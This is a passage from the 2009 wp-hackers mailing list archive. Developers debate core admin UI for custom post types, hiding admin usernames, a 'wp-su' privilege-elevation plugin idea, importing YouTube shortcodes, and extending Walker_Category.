Meh.

>> ...to have an "Post Types" link under the Settings menu that lets user add new post types with nothing more (to start) then just a way to add new types names and see a list of those names.
> 
> I disagree.  In a default install there is no need, and what you describe is too little use without more custom code via a plugin anyway.

Why is there no need?  If I can add a new content type (i.e. an "event" for example) in the UA then I can add-hoc use custom fields for start and end times and I can write custom loops in the theme to pull a list of events.  It's one tiny bit of additional functionality that would enable a huge amount of value. Requiring a plugin to expose such a core feature seems backward.

Besides if that feature is blocked from the core then every plugin is going to (have to) implement the exact same "core" functionality only will all implement it differently.    It'll be the same fustercluck that we had with post images where every image plugin implemented a different and incompatible way to add a post image. Thank goodness that 2.9 finally addressed that issue.
> 
>> In combination, I think having a list of known types for a given site stored in wp_options is really important.
> 
> How is it stored now?  2.9 allows you to register Post Types now, doesn't it?  Where is it stored?

Only in memory.  Post types are not (currently) serialized to disk in 2.9.  Here's the code:

function register_post_type($post_type, $args = array()) {
	global $wp_post_types;

	if (!is_array($wp_post_types))
		$wp_post_types = array();

	$defaults = array('exclude_from_search' => true);
	$args = wp_parse_args($args, $defaults);

	$post_type = sanitize_user($post_type, true);
	$args['name'] = $post_type;
	$wp_post_types[$post_type] = (object) $args;
}

-Mike

From ian at themeshaper.com  Sun Dec  6 04:29:44 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Sat, 5 Dec 2009 22:29:44 -0600
Subject: [wp-hackers] Possible security patch
In-Reply-To: <474320ee0912051231iabf6a1fy2abc1b225c49ef8@mail.gmail.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com> 
	<349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com> 
	<4B1AB807.2000503@mullenweg.com>
	<89E1DB95-31B7-46E1-A299-DCB2426964D5@yoast.com> 
	<4B1ABEC2.6040609@mullenweg.com>
	<474320ee0912051231iabf6a1fy2abc1b225c49ef8@mail.gmail.com>
Message-ID: <a8405fa30912052029v5fb4ec03u33f1ca98a4acbcba@mail.gmail.com>

What I'm proposing would be using an alternate sanitized name in both the
body_class AND the author URLs. The correct solution probably is to avoid
using the admin account for posting. I'd argue though that most people do
use the admin account for posting and will continue to whether or not it is
the correct solution. Even if they know it's the correct solution. Just like
people choose to use weak passwords, leave their plugins and themes and
copies of WordPress out of date and do countless other things that aren't
correct.

That said, I hadn't heard of the user switching plugin before. Thanks for
that. That'll make doing the correct thing a lot easier. Cheers.

On Sat, Dec 5, 2009 at 2:31 PM, Steven Rossi <SuperMoonMan at gmail.com> wrote:

> Yeah, I think the User Switching plugin would be a nice feature to have
> built-in, but consider how often you use it on your OS. It's really a
> breeze
> to use a non-administrator account on a PC (it's easier on a Mac, but less
> relevant because of less threat) and to switch to an administrator account
> when necessary, whether through Fast User Switching or the Run As...
> right-click function (if that still exists past XP, I'm not sure), but who
> actually does that? Too inconvenient. I'm just not sure having that
> functionality included in Wordpress would be much more than a "nice
> feature."
>
> Steven Rossi
> http://www.letsmovetothemoon.com
> http://www.stevenjrossi.com
> http://www.twitter.com/supermoonman
>
> On Sat, Dec 5, 2009 at 3:12 PM, Matt Mullenweg <m at mullenweg.com> wrote:
>
> > On 2009-12-05 11:45 AM, Joost de Valk wrote:
> >
> >> Can I vote for rolling the user switching plugin into core?
> >>
> >
> > You can, but it doesn't have anything to do with security.
> >
> >
> > --
> > Matt Mullenweg
> > http://ma.tt | http://wordpress.org | http://automattic.com
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From SuperMoonMan at gmail.com  Sun Dec  6 04:35:39 2009
From: SuperMoonMan at gmail.com (Steven Rossi)
Date: Sat, 5 Dec 2009 23:35:39 -0500
Subject: [wp-hackers] Possible security patch
In-Reply-To: <a8405fa30912052029v5fb4ec03u33f1ca98a4acbcba@mail.gmail.com>
References: <a8405fa30912050738n112bba69s944171c92b9669cf@mail.gmail.com> 
	<349fe48b0912050828g3813400fwb292afd353772acc@mail.gmail.com> 
	<4B1AB807.2000503@mullenweg.com>
	<89E1DB95-31B7-46E1-A299-DCB2426964D5@yoast.com> 
	<4B1ABEC2.6040609@mullenweg.com>
	<474320ee0912051231iabf6a1fy2abc1b225c49ef8@mail.gmail.com> 
	<a8405fa30912052029v5fb4ec03u33f1ca98a4acbcba@mail.gmail.com>
Message-ID: <474320ee0912052035r415bd91cx4488dbab5b5fc132@mail.gmail.com>

Could you maybe flesh the name sanitization out a little bit? If you're
thinking of something that will provide positive security (albeit through
obscurity, which you've already mentioned isn't exactly the WordPress
way...) without diminishing functionality, I think it'd be worth an honest
evaluation.

Steven Rossi
http://www.letsmovetothemoon.com
http://www.stevenjrossi.com
http://www.twitter.com/supermoonman

On Sat, Dec 5, 2009 at 11:29 PM, Ian Stewart <ian at themeshaper.com> wrote:

> What I'm proposing would be using an alternate sanitized name in both the
> body_class AND the author URLs. The correct solution probably is to avoid
> using the admin account for posting. I'd argue though that most people do
> use the admin account for posting and will continue to whether or not it is
> the correct solution. Even if they know it's the correct solution. Just
> like
> people choose to use weak passwords, leave their plugins and themes and
> copies of WordPress out of date and do countless other things that aren't
> correct.
>
> That said, I hadn't heard of the user switching plugin before. Thanks for
> that. That'll make doing the correct thing a lot easier. Cheers.
>
> On Sat, Dec 5, 2009 at 2:31 PM, Steven Rossi <SuperMoonMan at gmail.com>
> wrote:
>
> > Yeah, I think the User Switching plugin would be a nice feature to have
> > built-in, but consider how often you use it on your OS. It's really a
> > breeze
> > to use a non-administrator account on a PC (it's easier on a Mac, but
> less
> > relevant because of less threat) and to switch to an administrator
> account
> > when necessary, whether through Fast User Switching or the Run As...
> > right-click function (if that still exists past XP, I'm not sure), but
> who
> > actually does that? Too inconvenient. I'm just not sure having that
> > functionality included in Wordpress would be much more than a "nice
> > feature."
> >
> > Steven Rossi
> > http://www.letsmovetothemoon.com
> > http://www.stevenjrossi.com
> > http://www.twitter.com/supermoonman
> >
> > On Sat, Dec 5, 2009 at 3:12 PM, Matt Mullenweg <m at mullenweg.com> wrote:
> >
> > > On 2009-12-05 11:45 AM, Joost de Valk wrote:
> > >
> > >> Can I vote for rolling the user switching plugin into core?
> > >>
> > >
> > > You can, but it doesn't have anything to do with security.
> > >
> > >
> > > --
> > > Matt Mullenweg
> > > http://ma.tt | http://wordpress.org | http://automattic.com
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Ian Stewart
>
> http://ThemeShaper.com/
> http://twitter.com/iandstewart/
> http://ianstewart.stumbleupon.com/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at dd32.id.au  Sun Dec  6 04:55:19 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sun, 06 Dec 2009 15:55:19 +1100
Subject: [wp-hackers] Su for WP: wp-su (Was: Possible security patch)
Message-ID: <op.u4h2mhcwspxmuu@dd32>

On Sun, 06 Dec 2009 15:29:44 +1100, Ian Stewart <ian at themeshaper.com>  
wrote:

> The correct solution probably is to avoid
> using the admin account for posting. I'd argue though that most people do
> use the admin account for posting and will continue to whether or not it  
> is
> the correct solution. Even if they know it's the correct solution. Just  
> like
> people choose to use weak passwords

I've been working on a plugin the past few days for that exact reason,  
That a lot of users just use a Administrative account..

The idea? Wp-Su

Put simply, It adds an extra line of security to WordPress, No longer do  
you have an Administrative account, You have an account with minimal  
privledges -  Enough to let you write posts, edit posts, and do the  
majority of what you would do..
But in the event that you wish to change a blog option, Theres no need to  
log out and log into the admin account, Just hit the Su link, Type in the  
extra password (Which can(should) differ from you user account password),  
and all the administrative features are open (For a predetermined time,  
5minutes? 15, 30minutes).

I've had some people ask me flat out, Whats the point. Just use a Editor  
account. OR Why? Arnt people just going to sniff the Su password as well?

I came up with a simple list for that:
  1. Users should never use accounts which have more privledges than they  
require
  2. Users should only ever log into administrative accounts on  
computers/networks they trust 100%
  3. Users should never use the same password for everything
  4. Majority of keyloggers are generally only targetting User/password  
combinations

How many people know of a user who doesnt follow 1-3?
How many people know of a bank which no longer uses a username and  
password combo? And instead, Has an extra layer of security (Picture  
password for example, or SMS)? - Pretty much all of them.

Currently.. My plugin is unreleased, However, will be out by the time 2.9  
ships, will require WP 2.9, and whilst the UI integration isnt as good as  
i'd like (due to WP shortcomings in filters at present), Uses a extra text  
password (instead of Pictures/phrases/whatever), and is presently mainly a  
proof of concept.

Right now, The user enables the plugin, Selects which roles should have  
access to a Su environment, and select which caps should be protected by  
Su use (ie. Plugin, Blog, Theme and User options/edits should only be done  
by Su users, However Post publishing, page editing, etc can be done by a  
"normal" user).. I'm hoping to extend that to have a short wizard which  
prompts to user to set it up properly before release however.

Thoughts? Anyone want the Beta? (Email me off list please - It could do  
with some security testing before release.. Not sure i got the User Cookie  
100% right)

From SuperMoonMan at gmail.com  Sun Dec  6 05:09:18 2009
From: SuperMoonMan at gmail.com (Steven Rossi)
Date: Sun, 6 Dec 2009 00:09:18 -0500
Subject: [wp-hackers] Su for WP: wp-su (Was: Possible security patch)
In-Reply-To: <op.u4h2mhcwspxmuu@dd32>
References: <op.u4h2mhcwspxmuu@dd32>
Message-ID: <474320ee0912052109u6261b7bbvf86ef3a8fd1a36bf@mail.gmail.com>

Sounds like a cool plugin which will certainly serve its purpose for users
that install it. The problem it might run into is that
getting-people-to-use-it part. People that know how this stuff works well
enough to realize they should be using something like this are probably
already using something like this--or at least being smart about their
usernames/passwords. Because really, something like this is definitely an
inconvenience, despite it providing valuable security. If you could get the
message of the importance of this out there, I totally support your plugin.

Steven Rossi
http://www.letsmovetothemoon.com
http://www.stevenjrossi.com
http://www.twitter.com/supermoonman

On Sat, Dec 5, 2009 at 11:55 PM, Dion Hulse (dd32) <wordpress at dd32.id.au>wrote:

> On Sun, 06 Dec 2009 15:29:44 +1100, Ian Stewart <ian at themeshaper.com>
> wrote:
>
>  The correct solution probably is to avoid
>> using the admin account for posting. I'd argue though that most people do
>> use the admin account for posting and will continue to whether or not it
>> is
>> the correct solution. Even if they know it's the correct solution. Just
>> like
>> people choose to use weak passwords
>>
>
> I've been working on a plugin the past few days for that exact reason, That
> a lot of users just use a Administrative account..
>
> The idea? Wp-Su
>
> Put simply, It adds an extra line of security to WordPress, No longer do
> you have an Administrative account, You have an account with minimal
> privledges -  Enough to let you write posts, edit posts, and do the majority
> of what you would do..
> But in the event that you wish to change a blog option, Theres no need to
> log out and log into the admin account, Just hit the Su link, Type in the
> extra password (Which can(should) differ from you user account password),
> and all the administrative features are open (For a predetermined time,
> 5minutes? 15, 30minutes).
>
> I've had some people ask me flat out, Whats the point. Just use a Editor
> account. OR Why? Arnt people just going to sniff the Su password as well?
>
> I came up with a simple list for that:
>  1. Users should never use accounts which have more privledges than they
> require
>  2. Users should only ever log into administrative accounts on
> computers/networks they trust 100%
>  3. Users should never use the same password for everything
>  4. Majority of keyloggers are generally only targetting User/password
> combinations
>
> How many people know of a user who doesnt follow 1-3?
> How many people know of a bank which no longer uses a username and password
> combo? And instead, Has an extra layer of security (Picture password for
> example, or SMS)? - Pretty much all of them.
>
> Currently.. My plugin is unreleased, However, will be out by the time 2.9
> ships, will require WP 2.9, and whilst the UI integration isnt as good as
> i'd like (due to WP shortcomings in filters at present), Uses a extra text
> password (instead of Pictures/phrases/whatever), and is presently mainly a
> proof of concept.
>
> Right now, The user enables the plugin, Selects which roles should have
> access to a Su environment, and select which caps should be protected by Su
> use (ie. Plugin, Blog, Theme and User options/edits should only be done by
> Su users, However Post publishing, page editing, etc can be done by a
> "normal" user).. I'm hoping to extend that to have a short wizard which
> prompts to user to set it up properly before release however.
>
> Thoughts? Anyone want the Beta? (Email me off list please - It could do
> with some security testing before release.. Not sure i got the User Cookie
> 100% right)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Sun Dec  6 05:12:03 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Sat, 5 Dec 2009 23:12:03 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <04D9AC6C-BA76-4900-9752-C8358B1A1DBE@newclarity.net>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
	<54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
	<F977A87E-2B91-44EA-8096-75220DEE586C@striderweb.com>
	<04D9AC6C-BA76-4900-9752-C8358B1A1DBE@newclarity.net>
Message-ID: <90519D08-0FBB-489A-8442-165081837F4B@striderweb.com>


On Dec 5, 2009, at 9:38 PM, Mike Schinkel wrote:

> I think we are in full agreement except on weather there should or should not be any admin UI for custom posts built into the core.

Sounds about right.  I want to make it easy for plugins to do this stuff, but it is still IMO strictly plugin territory to actually use it.  If we're going to add Core GUI to set up custom post types, we would need GUI for adding (and defining -- specifically!) the add and edit pages, and their locations, etc. etc.

As I said in the initial email in this thread: "If we can't do it without significant bloat, it's not worth doing."  This is all backend stuff.

If *after* we do this you want to try and get a GUI added, go for it; but honestly (and no offense intended) I don't think you'll get much traction with that.

>>> What's more, minimally I think it would be really a good idea in 2.9 to have an "Post Types" link under the Settings menu that lets user add new post types with nothing more (to start) then just a way to add new types names and see a list of those names.
>> 
>> I disagree.  In a default install there is no need, and what you describe is too little use without more custom code via a plugin anyway.
> 
> Why is there no need?  If I can add a new content type (i.e. an "event" for example) in the UA then I can add-hoc use custom fields for start and end times and I can write custom loops in the theme to pull a list of events.  It's one tiny bit of additional functionality that would enable a huge amount of value. Requiring a plugin to expose such a core feature seems backward.

At any rate you'll have to have a custom Theme, and any theme using the custom post types could have the necessary code in functions.php.  I can't see any way (without MASSIVE changes to WP) to use custom post types without *some* sort of custom coding.  So... plugin.

Again, we can agree to disagree on this one.  Let's get the API and then later you can have a go at adding extra GUI for it.

> Besides if that feature is blocked from the core then every plugin is going to (have to) implement the exact same "core" functionality only will all implement it differently.

Are you talking about a plugin that allows the user to create arbitrary new post types?  I admin I wasn't thinking in that direction -- I was assuming that a site would have a specific need and a plugin/theme would be written to address that particular need.  Again, remember that whatever custom post types are introduced, the theme must be made to accommodate.

If that's *not* what your talking about, then I'm a bit confused.  The main thing I'm trying to do is implement a "Create Edit Page" system that will be a standard method of making Edit Pages for custom Post Types.  Thus any plugin that uses that system will result in Edit pages that are essentially similar.

That is, I'm precisely trying to *avoid* "every plugin is going to (have to) implement the exact same 'core' functionality", by creating a simple, standard method for doing just that.

Not sure what you mean by "blocked from core".  I'm only "blocking" adding a GUI for adding arbitrary Post Types.  A plugin can do that if you like, but most users don't need this.  This is to make customization easier.

>>> I think having a list of known types for a given site stored in wp_options is really important.
>> 
>> How is it stored now?  2.9 allows you to register Post Types now, doesn't it?  Where is it stored?
> 
> Only in memory.  Post types are not (currently) serialized to disk in 2.9.

Question: so long as the array can be referenced, what does it matter if it's in memory or on disk? It's still information that can be used by other code.

-- 
Stephen Rider
http://striderweb.com/


From wordpress at dd32.id.au  Sun Dec  6 05:21:14 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Sun, 06 Dec 2009 16:21:14 +1100
Subject: [wp-hackers] Su for WP: wp-su (Was: Possible security patch)
In-Reply-To: <474320ee0912052109u6261b7bbvf86ef3a8fd1a36bf@mail.gmail.com>
References: <op.u4h2mhcwspxmuu@dd32>
	<474320ee0912052109u6261b7bbvf86ef3a8fd1a36bf@mail.gmail.com>
Message-ID: <op.u4h3to2pspxmuu@dd32>

I thought of the same thing. And in the end, I thought, If i dont try,  
it'll never happen.

Ultimately, Those who use it will be someone who's had WP installed by  
someone else, Or have googled on how to keep their installs secure i  
think.. Originally it was more of a POC, but after talking to a few people  
about it, they saw the benefit of it.

I myself, Do not actually abide by most of those security rules i listed..  
So i know theres definately a chunk of users out there for it :)


On Sun, 06 Dec 2009 16:09:18 +1100, Steven Rossi <SuperMoonMan at gmail.com>  
wrote:

> Sounds like a cool plugin which will certainly serve its purpose for  
> users
> that install it. The problem it might run into is that
> getting-people-to-use-it part. People that know how this stuff works well
> enough to realize they should be using something like this are probably
> already using something like this--or at least being smart about their
> usernames/passwords. Because really, something like this is definitely an
> inconvenience, despite it providing valuable security. If you could get  
> the
> message of the importance of this out there, I totally support your  
> plugin.
>
> Steven Rossi
> http://www.letsmovetothemoon.com
> http://www.stevenjrossi.com
> http://www.twitter.com/supermoonman
>
> On Sat, Dec 5, 2009 at 11:55 PM, Dion Hulse (dd32)  
> <wordpress at dd32.id.au>wrote:
>
>> On Sun, 06 Dec 2009 15:29:44 +1100, Ian Stewart <ian at themeshaper.com>
>> wrote:
>>
>>  The correct solution probably is to avoid
>>> using the admin account for posting. I'd argue though that most people  
>>> do
>>> use the admin account for posting and will continue to whether or not  
>>> it
>>> is
>>> the correct solution. Even if they know it's the correct solution. Just
>>> like
>>> people choose to use weak passwords
>>>
>>
>> I've been working on a plugin the past few days for that exact reason,  
>> That
>> a lot of users just use a Administrative account..
>>
>> The idea? Wp-Su
>>
>> Put simply, It adds an extra line of security to WordPress, No longer do
>> you have an Administrative account, You have an account with minimal
>> privledges -  Enough to let you write posts, edit posts, and do the  
>> majority
>> of what you would do..
>> But in the event that you wish to change a blog option, Theres no need  
>> to
>> log out and log into the admin account, Just hit the Su link, Type in  
>> the
>> extra password (Which can(should) differ from you user account  
>> password),
>> and all the administrative features are open (For a predetermined time,
>> 5minutes? 15, 30minutes).
>>
>> I've had some people ask me flat out, Whats the point. Just use a Editor
>> account. OR Why? Arnt people just going to sniff the Su password as  
>> well?
>>
>> I came up with a simple list for that:
>>  1. Users should never use accounts which have more privledges than they
>> require
>>  2. Users should only ever log into administrative accounts on
>> computers/networks they trust 100%
>>  3. Users should never use the same password for everything
>>  4. Majority of keyloggers are generally only targetting User/password
>> combinations
>>
>> How many people know of a user who doesnt follow 1-3?
>> How many people know of a bank which no longer uses a username and  
>> password
>> combo? And instead, Has an extra layer of security (Picture password for
>> example, or SMS)? - Pretty much all of them.
>>
>> Currently.. My plugin is unreleased, However, will be out by the time  
>> 2.9
>> ships, will require WP 2.9, and whilst the UI integration isnt as good  
>> as
>> i'd like (due to WP shortcomings in filters at present), Uses a extra  
>> text
>> password (instead of Pictures/phrases/whatever), and is presently  
>> mainly a
>> proof of concept.
>>
>> Right now, The user enables the plugin, Selects which roles should have
>> access to a Su environment, and select which caps should be protected  
>> by Su
>> use (ie. Plugin, Blog, Theme and User options/edits should only be done  
>> by
>> Su users, However Post publishing, page editing, etc can be done by a
>> "normal" user).. I'm hoping to extend that to have a short wizard which
>> prompts to user to set it up properly before release however.
>>
>> Thoughts? Anyone want the Beta? (Email me off list please - It could do
>> with some security testing before release.. Not sure i got the User  
>> Cookie
>> 100% right)
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Using Opera's revolutionary e-mail client: http://www.opera.com/mail/

From mikeschinkel at newclarity.net  Sun Dec  6 06:31:00 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 6 Dec 2009 01:31:00 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <90519D08-0FBB-489A-8442-165081837F4B@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
	<FADAE09C-2A24-4EF7-B35E-3666BF130144@xentek.net>
	<C861EFC8-5670-4191-80E6-B7473ADF5FC3@striderweb.com>
	<79A04F64-1A67-496A-AC7C-1A68A98B3315@striderweb.com>
	<80f08458-f6f2-4b89-8b16-22ce8089f0f3@b36g2000prf.googlegroups.com>
	<1275E35F-A8FD-4539-BDE1-9BBF8D5DF529@ptahd.com>
	<54B9B373-E0D3-46DC-9898-2038F6768236@newclarity.net>
	<F977A87E-2B91-44EA-8096-75220DEE586C@striderweb.com>
	<04D9AC6C-BA76-4900-9752-C8358B1A1DBE@newclarity.net>
	<90519D08-0FBB-489A-8442-165081837F4B@striderweb.com>
Message-ID: <43D49C93-6F0F-48F6-A421-92FE865D05F3@newclarity.net>

On Dec 6, 2009, at 12:12 AM, Stephen Rider wrote:
> On Dec 5, 2009, at 9:38 PM, Mike Schinkel wrote:
> I think we are in full agreement except on weather there should or should not be any admin UI for custom posts built into the core.
> 
> Sounds about right.  I want to make it easy for plugins to do this stuff, but it is still IMO strictly plugin territory to actually use it.  If we're going to add Core GUI to set up custom post types, we would need GUI for adding (and defining -- specifically!) the add and edit pages, and their locations, etc. etc.
> 
> If *after* we do this you want to try and get a GUI added, go for it; but honestly (and no offense intended) I don't think you'll get much traction with that.

At this point, yes, let's get the functions working.  After that I think the need for an admin UI addition to the core will become a need that will be obvious to many.  Let's wait and see?
> 
>>>> What's more, minimally I think it would be really a good idea in 2.9 to have an "Post Types" link under the Settings menu that lets user add new post types with nothing more (to start) then just a way to add new types names and see a list of those names.
>>> 
>>> I disagree.  In a default install there is no need, and what you describe is too little use without more custom code via a plugin anyway.
>> 
>> Why is there no need?  If I can add a new content type (i.e. an "event" for example) in the UA then I can add-hoc use custom fields for start and end times and I can write custom loops in the theme to pull a list of events.  It's one tiny bit of additional functionality that would enable a huge amount of value. Requiring a plugin to expose such a core feature seems backward.
> 
> At any rate you'll have to have a custom Theme, and any theme using the custom post types could have the necessary code in functions.php.  I can't see any way (without MASSIVE changes to WP) to use custom post types without *some* sort of custom coding.  So... plugin.

FWIW it's a *lot* easier for a designer who is new to PHP to learn how to add the following to a theme file file single.php than it is to wrap their head around how hooks work and how to define functions, etc.

<?php print get_post_custom_values('event_start_time'); ?>

So.... not plugin.  :)

> Again, we can agree to disagree on this one.  Let's get the API and then later you can have a go at adding extra GUI for it.

Yep, we are one\ the same page here.

>> Besides if that feature is blocked from the core then every plugin is going to (have to) implement the exact same "core" functionality only will all implement it differently.
> 
> Are you talking about a plugin that allows the user to create arbitrary new post types?  I admin I wasn't thinking in that direction -- I was assuming that a site would have a specific need and a plugin/theme would be written to address that particular need.  Again, remember that whatever custom post types are introduced, the theme must be made to accommodate.

I can readily envision that many end users could see the need to add custom post types for given things that are specific to their own use cases. For example, an anime fan may want to catalog a list of all the anime conferences[1].  A mommy blogger might want to add a custom post type for her field trips[2].   An insurance industry blogger may want to create a list of local agents and also the interviews that he has had with each of them[3].  A social media marketing person may want to create a list of local events[4].

[1] http://fandomu.com/
[2] http://www.fieldtripswithsue.com/
[3] http://www.atlantainsurancelive.com/
[4] http://groups.yahoo.com/group/ATLeventsandscoop/

Those are just four examples of people I know who could use what I'm talking about yet none of them are programmers. And those use cases are pretty unique to the individuals.  I see them going without the ability to classify the things that are important to them long before they ever write a plugin.

There are many uses cases for custom post types, probably as many as their are blogs out there.  Yes there will be some common use cases that have people building plugins for them but there will be a much greater number of long tail use cases for custom post types that are exactly specific to the end user.  

It's just like Microsoft Access (or MySQL.)  How useful would it be if the database vendors predefine all table types you could use?  If they had there would almost certainly be no WordPress because the innovation would have been limited to the team defining the "approved" table types.  If there is no admin is made available in the UI to simply add new post types then all that creativity will stay locked in that genie's bottle.  Are the benefits to blocking all that really that great?  

> If that's *not* what your talking about, then I'm a bit confused.  The main thing I'm trying to do is implement a "Create Edit Page" system that will be a standard method of making Edit Pages for custom Post Types.  Thus any plugin that uses that system will result in Edit pages that are essentially similar.

And for the record I applaud that.

> That is, I'm precisely trying to *avoid* "every plugin is going to (have to) implement the exact same 'core' functionality", by creating a simple, standard method for doing just that.

Yes, agreed. OTOH every plugin that needs to let people add new post types of their own choosing will proliferate the ways to do that. 

For example I can envision a plugin that let's people define how custom fields will be displayed and then will display them at the end of the_content() making it possible to display custom fields for a custom post type without having to modify a theme. If there is no way to add custom post types that plugin would have to add that functionality

Then I could see another plugin that would let a user define what custom fields a custom type would have by default (oops, there already is such a plugin: Flutter.)  That plugin would also need to let users add custom post types. 

And so on.  

Since it will be a fundamental need shared by several plugins *and* since end users could really use the functionality there will ideally be a standard way to add a new custom post type. That standard way can do nothing more than add a string to a list i.e. adding "product" to the "custom_post_types" key in the wp_options table (or create a custom taxonomy and use the taxonomy system?) and *optionally* add a management menu in the admin for that type. 


> Not sure what you mean by "blocked from core".  I'm only "blocking" adding a GUI for adding arbitrary Post Types.  

When I say "blocking" it's shorthand for "advocating against."

> A plugin can do that if you like, but most users don't need this.  This is to make customization easier.


How do you know most user's don't need it?  I believe that 90% of greater of WordPress users need it but most simply are technical enough to know what to ask for.  People didn't ask for gasoline to power their cars in the days where everyone rode in horse and buggy.  Once people realize that custom post types are possible in WordPress I expect a huge groundswell of demand.

But we don't need to debate it;  what you are proposing needs to come first, and then if I'm right the demand will materialize after people like Justin Tadlock start writing articles about what is possible.

>>> How is it stored now?  2.9 allows you to register Post Types now, doesn't it?  Where is it stored?
>> 
>> Only in memory.  Post types are not (currently) serialized to disk in 2.9.
> 
> Question: so long as the array can be referenced, what does it matter if it's in memory or on disk? It's still information that can be used by other code.

Good point in most cases. But you can't do a SQL JOIN with data only in PHP so not workable in all cases.  I guess it comes down to the question of whether the MySQL database should have the knowledge independent of running code, or if that information should be in the database.  Personally I think it should in the database because I think it will be needed there.

Also, if stored in the database then the register could be done on activation and not on every page load hence improving performance slightly.

Lastly, if it is only stored in code then plugins that want to give an end user the ability to add a custom post type will end up persisting those custom post types in different ways. Again, it will could get ugly.

-Mike

From jayarjo at gmail.com  Sun Dec  6 08:13:26 2009
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Sun, 6 Dec 2009 12:13:26 +0400
Subject: [wp-hackers] Little problem while importing Wordpress.com WXR into
	regular wordpress installation...
Message-ID: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>

Wordpress.com let's users to embed youtube videos (and some others)
using following syntax:

[youtube=http://in.youtube.com/watch?v=VWE7oVKe2Ws]

Now when we did export from Wordpress.com and imported WXR into
regular wordpress installation, all we get in the post is that tag in
textual representation. No resolution into embed video happens. I
guess it's because regular wordpress doesn't support this syntax. Is
there any plugin that does mimic such behavior? Or any hack to turn
those tags into embeds?

I know it's possible to write a plugin, but maybe there already exists one?

-- 
Davit Barbakadze

From joost at yoast.com  Sun Dec  6 08:59:18 2009
From: joost at yoast.com (Joost de Valk)
Date: Sun, 6 Dec 2009 09:59:18 +0100
Subject: [wp-hackers] Little problem while importing Wordpress.com WXR
	into regular wordpress installation...
In-Reply-To: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>
References: <9aa12a490912060013t1c9394bdi15bad6adb4a39528@mail.gmail.com>
Message-ID: <666eb9f0912060059l6912a599k200a10edccfb7b81@mail.gmail.com>

Viper's Video Quick Tags would be of help here:

http://www.viper007bond.com/wordpress-plugins/vipers-video-quicktags/

Although I don't know whether it supports that specific syntax, if it
doesn't, you might have to change it to

[youtube]http://in.youtube.com/watch?v=VWE7oVKe2Ws[/youtube]

That's quite easily done using this plugin:

http://wordpress.org/extend/plugins/search-and-replace/

Hope that helps,

Cheers
Joost

On Sun, Dec 6, 2009 at 9:13 AM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> Wordpress.com let's users to embed youtube videos (and some others)
> using following syntax:
>
> [youtube=http://in.youtube.com/watch?v=VWE7oVKe2Ws]
>
> Now when we did export from Wordpress.com and imported WXR into
> regular wordpress installation, all we get in the post is that tag in
> textual representation. No resolution into embed video happens. I
> guess it's because regular wordpress doesn't support this syntax. Is
> there any plugin that does mimic such behavior? Or any hack to turn
> those tags into embeds?
>
> I know it's possible to write a plugin, but maybe there already exists one?
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ghodmode at ghodmode.com  Sun Dec  6 10:12:24 2009
From: ghodmode at ghodmode.com (Ghodmode)
Date: Sun, 06 Dec 2009 23:12:24 +1300
Subject: [wp-hackers] overriding a class method for just one theme
Message-ID: <1260094345.10407.16.camel@home>

If I extend a WordPress class and override one or more methods, is there
a common convention that I should follow for where I define my class?

Right now I only need it for a specific theme I'm working on, but I'll
probably want to use this again, so I don't think I should put it into
functions.php for the theme I'm working on.

Should I create my own includes directory either from the document root
or the theme's directory (ie: /wp-content/themes/mytheme/includes), and
put the php file containing the class in there?

Here's the context:
I want wp_list_categories() to put the count of posts for each category
inside of the text of the link for the categories section of the
sidebar.  After looking through the code, I've decided that I should
create my own class to extend Walker_Category (which extends Walker)
(classes.php) and override the display_element() method (from Walker) so
that it does what I want.

Is this the right way to go about it?

Thank you.

-- 
Ghodmode
http://www.ghodmode.com


From burobjorn at gmail.com  Sun Dec  6 12:58:37 2009
From: burobjorn at gmail.com (Bjorn Wijers)
Date: Sun, 06 Dec 2009 13:58:37 +0100
